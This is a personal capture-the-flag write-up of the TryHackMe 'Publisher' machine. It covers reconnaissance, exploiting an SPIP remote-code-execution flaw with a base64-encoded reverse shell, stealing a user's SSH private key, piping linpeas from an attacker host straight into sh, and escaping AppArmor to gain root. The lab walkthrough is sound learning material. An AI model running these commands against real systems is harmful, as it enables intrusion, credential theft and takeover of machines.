Publisher
Initial Comments

Publisher was a wonderful refresher back to THM and CTF-style hacking that I needed. I was able to shake some rust off and get back into the way of thinking that these vulnerable boxes require to get the job done. I will say if it wasn't for the hints. I'm not sure the time it would have taken me to gett around to getting this completed. I'm happy with the overall experience from this one and believe this will help propel me upward for the rest to come as I get back into the groove of things.
Information Gathering
Initial information gathering was done with Nmap, to obtain open ports. nmap -sC -sV -oN open_ports.txt [Publisher IP]



The web server was nothing of interest alone.


To get all the accessible sub-directories for this gobuster was utilized.

gobuster dir -u [Publisher IP] -w/usr/share/wordlists/dirbuster/directory-list-2.3.small.txt



Enumerating another directory level for "/spip" reveals the following:



Found a login page on the '../spip/ecrire' sub-directory. In addition to this, we know that the CMS in use is SPIP, viewing the page source we find the version of SPIP being used:



Exploitation
A google search shows SPIP 4.2.0 has a RCE vulnerability, with a POC vulnerability and python command found on GitHub, https://github.com/nuts7/CVE-2023-27372.

There was some necessary hand-work involved to get this running. It was found that encoding a reverse shell and then sending it as the command to run worked best and allowed access as 'www-data'.

python3 CVE-2023-27372.py -u [Publisher IP]\spip\ecrire -c 'echo [base64 code]|base64 -d|bash'



Shifted directly to the '/home' directory to find the "think" user. The permissions for this directory were loose, which allowed the copy & paste of the 'id_rsa' key within this users directory.



Saving the 'id_rsa' key to the attacking machine as 'think_id', changing the permissions to ensure SSH allows the use of this key, and then passing the key to sign in as "think" via SSH.



Now that access as the "think" user is made, the user.txt flag can be retrieved.


This is a snippet as to not spoil the entire flag

Post Exploitation
With access as "think", 'linpeas' was loaded to the Publisher machine to further enumerate for privilege escalation. With the previous access as 'www-data' commands like: wget, curl, ftp, etc., were not available. Now that there is an authenticated shell these commands assist in pushing files to and from the attacker machine.

curl http://[attacker-ip]:[port]/linpeas.sh|sh



The enumeration from 'linpeas' shows a odd SUID set for "/usr/sbin/run_container". Which after attempting to run will start, restart, stop, or create a container.

Comment
A considerable amount of time was spent attempting to understand next steps here. It wasn't until it felt like all directories had been traversed before finally hitting the 'hint' for an idea of what to do next.
Privilege Escalation
Understanding that AppArmor is keeping guard to thwart changes to the 'run_container' file that will subsequently deliver the root flag. Some research unearthed a few articles that delivered good knowledge and ideas for obtaining the next steps.

With countless avenues of information on 'AppArmor', the privilege escalation was relatively easy. We can view the blocks in current shell maintained with "think" user.



With this information it is obvious there is path to escalation in two directories due to improper handling of the config for "usr.sbin.ash" :

/dev/shm
/var/tmp
Heading into /dev/shm and utilizing the information out of GTFObins and enumeration from 'linpeas' it should be possible to simply copy over "/bin/bash" and then execute.



Now it should be possible to edit this file 'run_container.sh'. Utilizing vi a change was made to print the 'root.txt' file. Once saved and ran the root flag is revealed.



This wouldn't be proper privilege escalation if the 'root' user went untouched. Now that commands can be ran from the run_container there are a number of ways that 'root' can be accessed.

-shell into root from 'run_container' -cat out the 'id_rsa' for 'root' user.

create a new user with root level permissions.
etc.
Here is shell as root, as to close out privilege escalation:
